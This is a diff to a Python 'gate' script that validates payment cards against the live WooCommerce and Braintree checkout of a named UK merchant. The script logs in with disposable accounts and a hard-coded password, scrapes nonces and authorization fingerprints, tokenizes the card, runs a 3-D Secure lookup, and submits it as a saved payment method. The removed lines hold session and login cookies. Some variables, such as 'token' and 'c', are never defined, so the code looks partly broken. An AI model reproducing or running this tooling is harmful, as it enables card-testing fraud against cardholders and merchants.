@@ -4291,92 +4291,42 @@ def au(ccx):
 	mm = ccx.split("|")[1]
 	yy = ccx.split("|")[2]
 	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
+	if "20" in yy:
 		yy = yy.split("20")[1]
-	lines='''mdjfjfud7379ero%40gmail.com%7C1725424450%7CLqYXNbcCErhLrqZdbmICaxU8oMOfov0PFKBGPf8XkoQ%7C104da8606bf4e3ae298a7c3266ff3dfacce2574089846817dded4ae772124135'''
-	def up(big):
-		cookies = {
-		    '_gid': 'GA1.3.1249998794.1720519619',
-    'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'woocommerce_items_in_cart': '1',
-    'woocommerce_cart_hash': '25bf01b44c2b59350d1270ee5a8a1455',
-    'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
-    'wp_woocommerce_session_4d9c7ece763608b995b6637298409475': '109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9',
-    'PHPSESSID': 'fc641c458e935b4ca3cac6137eb80e25',
-    'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9',
-    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F',
-    '_ga_N2L0XQK3XK': 'GS1.1.1720608090.2.1.1720608702.0.0.0',
-    '_ga': 'GA1.3.755440368.1720519619',
-    '_gat_gtag_UA_160773292_1': '1',
+	acc = ['mehis41455@givehit.com','wayinod734@polatrix.com','simaxog738@polatrix.com','jelova3747@polatrix.com']
+	email = random.choice(acc)
+	print(F+email)
+	user = user_agent.generate_user_agent()
+	r = requests.session()
+	headers = {'user-agent': user}
+	response = r.post(
+	    'https://trade-chem.co.uk/my-account/add-payment-method/', headers=headers)
+	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
+	data = {
+    'username': email,
+    'password': 'A@Amir5520055',
+    'wpa_initiator': '',
+    'alt_s': '',
+    'domgux3030': '824565',
+    'woocommerce-login-nonce': nonce,
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'login': 'Log in',
+    'ct_bot_detector_event_token': '8b958efa528166f3f152b84177fdd3d5076b3feff9f7e6a54649f9b393152a8d',
 }
-		
-		headers = {
-		    'authority': 'trade-chem.co.uk',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    # 'cookie': '_gid=GA1.3.1249998794.1720519619; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=25bf01b44c2b59350d1270ee5a8a1455; wordpress_logged_in_4d9c7ece763608b995b6637298409475=Memri%7C1721817927%7Cer4O9XfdO58seH5shnwJbJrTQhyd5NDhCmfomYyOYqr%7Cb17cede3ce7a1663fe3135b2d1eb9a3d12be56cea0f70dddac1f6a8453d73ed2; wp_woocommerce_session_4d9c7ece763608b995b6637298409475=109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9; PHPSESSID=fc641c458e935b4ca3cac6137eb80e25; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fpayment-methods%2F; _ga_N2L0XQK3XK=GS1.1.1720608090.2.1.1720608702.0.0.0; _ga=GA1.3.755440368.1720519619; _gat_gtag_UA_160773292_1=1',
-    'referer': 'https://trade-chem.co.uk/my-account/payment-methods/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-}
-		
-		response = requests.get('https://trade-chem.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
-		anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
-		enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
-		dec = base64.b64decode(enc).decode('utf-8')
-		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
-		with open('gates.json', 'r') as json_file:
-			existing_data = json.load(json_file)
-# إضافة معلومات جديدة إلى البيانات الحالية
-			new_data = {
-				big : {
-	  "nonce": anonce,
-	  "au": au
-				}
-			}
 	
-			existing_data.update(new_data)
-	
-	# كتابة البيانات المحدثة إلى الملف
-			with open('gates.json', 'w') as json_file:
-				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
-	with open('fileccn.txt', 'r') as file:
-		first_line = file.readline()
-	lines = lines.strip().split('\n')
-	while True:
-		random_line_number = random.randint(0, len(lines) - 1)
-		big = lines[random_line_number]
-		if big == first_line:
-			pass
-		else:
-			with open('gates.json', 'r') as file:
-				json_data = json.load(file)
-			try:
-				anonce=json_data[big]['nonce']
-				au=json_data[big]['au']
-				break
-			except Exception as e:
-				for big in lines:
-					try:
-						up(big)
-					except Exception as e:
-						print(e)
-	with open('fileccn.txt', 'w') as file:
-		file.write(big)
+	response = r.post(
+	    'https://trade-chem.co.uk/my-account/add-payment-method/',
+	    cookies=r.cookies,
+	    headers=headers,
+	    data=data,
+	)
+	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
+	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
+	dec = base64.b64decode(enc).decode('utf-8')
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
 	headers = {
-	    'authority': 'payments.braintree-api.com',
+    'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
     'authorization': f'Bearer {au}',
@@ -4391,23 +4341,24 @@ def au(ccx):
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'cross-site',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	}
-	
+}
+
 	json_data = {
-	    'clientSdkMetadata': {
+    'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'af967d49-cb75-408a-9981-d8ac12760b8d',
+        'sessionId': '4def93a2-c72a-4408-a278-44cfb372b193',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
         'input': {
             'creditCard': {
-                'number': n,
+                'number': c,
                 'expirationMonth': mm,
                 'expirationYear': yy,
+                'cvv': cvc,
                 'billingAddress': {
-                    'postalCode': 'LE17 5NY',
+                    'postalCode': 'TW2 7LD',
                     'streetAddress': '323 E Pine St',
                 },
             },
@@ -4417,45 +4368,24 @@ def au(ccx):
         },
     },
     'operationName': 'TokenizeCreditCard',
-	}
-	
+}
+
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	try:
-		tok = response.json()['data']['tokenizeCreditCard']['token']
-	except:
-		for big in lines:
-			try:
-				up(big)
-			except Exception as e:
-				print(e)
-	headers = {
-	    'authority': 'api.braintreegateway.com',
-    'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'content-type': 'application/json',
-    'origin': 'https://trade-chem.co.uk',
-    'referer': 'https://trade-chem.co.uk/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'cross-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	}
+	tok = response.json()['data']['tokenizeCreditCard']['token']
 	
+	headers = {'user-agent': user}
 	json_data = {
     'amount': '0.00',
     'browserColorDepth': 24,
     'browserJavaEnabled': False,
     'browserJavascriptEnabled': True,
-    'browserLanguage': 'ar',
+    'browserLanguage': 'ar-EG',
     'browserScreenHeight': 800,
     'browserScreenWidth': 360,
     'browserTimeZone': -180,
     'deviceChannel': 'Browser',
     'additionalInfo': {
-        'ipAddress': '197.63.41.253',
+        'ipAddress': '197.63.99.139',
         'billingLine1': '323 E Pine St',
         'billingLine2': '',
         'billingCity': 'Deming',
@@ -4465,15 +4395,15 @@ def au(ccx):
         'billingPhoneNumber': '66464649',
         'billingGivenName': 'Mero',
         'billingSurname': 'AYman',
-        'email': 'nacofew477@iteradev.com',
+        'email': 'mehis41455@givehit.com',
     },
-    'bin': '434769',
+    'bin': '510875',
     'dfReferenceId': '0_3badc98d-9c3b-4202-b7b9-8b1dea848bf7',
     'clientMetadata': {
         'requestedThreeDSecureVersion': '2',
         'sdkVersion': 'web/3.106.0',
-        'cardinalDeviceDataCollectionTimeElapsed': 402,
-        'issuerDeviceDataCollectionTimeElapsed': 9434,
+        'cardinalDeviceDataCollectionTimeElapsed': 1055,
+        'issuerDeviceDataCollectionTimeElapsed': 219,
         'issuerDeviceDataCollectionResult': True,
     },
     'authorizationFingerprint': au,
@@ -4485,73 +4415,39 @@ def au(ccx):
         'source': 'client',
         'integration': 'custom',
         'integrationType': 'custom',
-        'sessionId': '522f5c93-bb3e-40ef-954d-6535bb76c94d',
+        'sessionId': '4def93a2-c72a-4408-a278-44cfb372b193',
     },
 }
-	
 	response = requests.post(
-	    f'https://api.braintreegateway.com/merchants/zkrjk5krj2dwnsgc/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
+	    f'https://api.braintreegateway.com/merchants/zkrjk5krj2dwnsgc/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
 	    headers=headers,
 	    json=json_data,
 	)
 	
-	nonce = response.json()['paymentMethod']['nonce']
 	import requests
-	
-	cookies = {
-	    '_gid': 'GA1.3.1249998794.1720519619',
-	    'woocommerce_items_in_cart': '1',
-	    'sbjs_migrations': '1418474375998%3D1',
-	    'sbjs_current_add': 'fd%3D2024-07-09%2011%3A01%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'sbjs_first_add': 'fd%3D2024-07-09%2011%3A01%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-	    'wordpress_logged_in_4d9c7ece763608b995b6637298409475': big,
-	    'wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450': '18542%7Cother%7Cread%7Cda63ea485f161e51e2f5d352f2d2ebed2f92294855b45d5ead0e05261b8709e3',
-	    'woocommerce_cart_hash': '7361ac106783123fb4637dfd2b17564b',
-	    'wp_woocommerce_session_4d9c7ece763608b995b6637298409475': '18542%7C%7C1720692445%7C%7C1720688845%7C%7C9eaa525075e1ef1d990cad95c36b1034',
-	    '_gat_gtag_UA_160773292_1': '1',
-	    '_ga_N2L0XQK3XK': 'GS1.1.1720519618.1.1.1720523294.0.0.0',
-	    '_ga': 'GA1.1.755440368.1720519619',
-	    'sbjs_session': 'pgs%3D26%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-	}
-	
-	headers = {
-	    'authority': 'trade-chem.co.uk',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-    'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_gid=GA1.3.1249998794.1720519619; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-10%2010%3A41%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; woocommerce_cart_hash=25bf01b44c2b59350d1270ee5a8a1455; wordpress_logged_in_4d9c7ece763608b995b6637298409475=Memri%7C1721817927%7Cer4O9XfdO58seH5shnwJbJrTQhyd5NDhCmfomYyOYqr%7Cb17cede3ce7a1663fe3135b2d1eb9a3d12be56cea0f70dddac1f6a8453d73ed2; wp_woocommerce_session_4d9c7ece763608b995b6637298409475=109204%7C%7C1720780909%7C%7C1720777309%7C%7C00fed84c31df72f5b73baaab3bfb90c9; PHPSESSID=fc641c458e935b4ca3cac6137eb80e25; wfwaf-authcookie-fdddcad932b8083b61bd8da62850a450=109204%7Cother%7Cread%7C2ac37e595edc42dd621980c7c24beb7a3d84a3ea7cdffb0e52830527587ffec9; _gat_gtag_UA_160773292_1=1; _ga_N2L0XQK3XK=GS1.1.1720608090.2.1.1720609735.0.0.0; _ga=GA1.1.755440368.1720519619; sbjs_session=pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftrade-chem.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-    'origin': 'https://trade-chem.co.uk',
-    'referer': 'https://trade-chem.co.uk/my-account/add-payment-method/',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	}
+	nonce = response.json()['paymentMethod']['nonce']
+	headers = {'user-agent': user}
 	
 	data = {
-	    'payment_method': 'braintree_cc',
+    'payment_method': 'braintree_cc',
     'braintree_cc_nonce_key': nonce,
-    'braintree_cc_device_data': '{"device_session_id":"4256a8eaeafb95f036feee32a4387f60","fraud_merchant_id":null,"correlation_id":"98a6b01c88173778e27db4bfa9b6d0b0"}',
+    'braintree_cc_device_data': '{"device_session_id":"5c1bda18d48c4e21f42b2fe7e576137f","fraud_merchant_id":null,"correlation_id":"4def93a2-c72a-4408-a278-44cfb372"}',
     'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zkrjk5krj2dwnsgc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zkrjk5krj2dwnsgc"},"merchantId":"zkrjk5krj2dwnsgc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"GBP","merchantIdentifier":"zkrjk5krj2dwnsgc","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":[],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5OGNjZjM1Ny1kZmFmLTRjYTEtOTdhNS0wZGZlNjQ4OGUyNjAiLCJpYXQiOjE3MjA2MDk1MjYsImV4cCI6MTcyMDYxNjcyNiwiaXNzIjoiNWQxY2Y1Njc2OTRlM2EyYjI0ZDdkY2U2IiwiT3JnVW5pdElkIjoiNWNhZTJmNjE1MTJjZmIwNzU0Yjk1YWZhIn0.6fI6iGjD8ZfqFsgILwvMHxa65JjZsoc51R88THhus9Y"},"androidPay":{"displayName":"Trade Chemicals Ltd","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjA2OTU5MjYsImp0aSI6IjlhYjI0YTYxLTMzYzAtNDI0YS1iYTkyLWJlY2U1ODEyODc3OSIsInN1YiI6InprcmprNWtyajJkd25zZ2MiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InprcmprNWtyajJkd25zZ2MiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.BkPD6JraXgzmd2dT9Y6b5TPq9IXytqExWhPbVnBpRMgelBYL19fSPckRgLPOPESNYhZf7cBu6O4-x-bbusfkeA","paypalClientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Trade Chemicals Ltd","clientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"stuarttradechemcouk","payeeEmail":null,"currencyIsoCode":"GBP"}}',
-    'woocommerce-add-payment-method-nonce': anonce,
+    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/zkrjk5krj2dwnsgc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/zkrjk5krj2dwnsgc"},"merchantId":"zkrjk5krj2dwnsgc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"GBP","merchantIdentifier":"zkrjk5krj2dwnsgc","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":[],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIwYjY0MDIwZS0yNDFjLTQxYWItODAwYi0xOGUyNzRmZjBiOTMiLCJpYXQiOjE3MjQyMzg2NDYsImV4cCI6MTcyNDI0NTg0NiwiaXNzIjoiNWQxY2Y1Njc2OTRlM2EyYjI0ZDdkY2U2IiwiT3JnVW5pdElkIjoiNWNhZTJmNjE1MTJjZmIwNzU0Yjk1YWZhIn0.jgCQSeWq1SpoYqSakCWZ7WJr3hbTOm0KQ5WXXY7Wpkc"},"androidPay":{"displayName":"Trade Chemicals Ltd","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQzMjUwNDYsImp0aSI6ImI0NzQyNzZjLWJjNWYtNDkzOS1iZjMyLWJhNjYzZjMyNTIzNSIsInN1YiI6InprcmprNWtyajJkd25zZ2MiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InprcmprNWtyajJkd25zZ2MiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.GGVrTMIcGfw2_bVblLgQzdUO8svp7NNvLjA795c92MV4HMK_gxtkrHxDoLhO5ePZ0-xtx4vVCWK7ymWFwivGvQ","paypalClientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Trade Chemicals Ltd","clientId":"AQ7JTt-XpW33Zz5awISJoOrKM6ujwZ5uPM8WRx3PBJd_YnNaQJyNYH7LZB1WNiuWUuk-yDvUfvAYEwsC","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"stuarttradechemcouk","payeeEmail":null,"currencyIsoCode":"GBP"}}',
+    'woocommerce-add-payment-method-nonce': nonce,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
-    'ct_bot_detector_event_token': 'dd2f6f71e896177e0654d9d88cd0deed9399653e630b5ab3ed3560a2669245d0',
+    'ct_bot_detector_event_token': '8b958efa528166f3f152b84177fdd3d5076b3feff9f7e6a54649f9b393152a8d',
     'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkIiwiaW52aXNpYmxlX2ZpZWxkc19jb3VudCI6OX19',
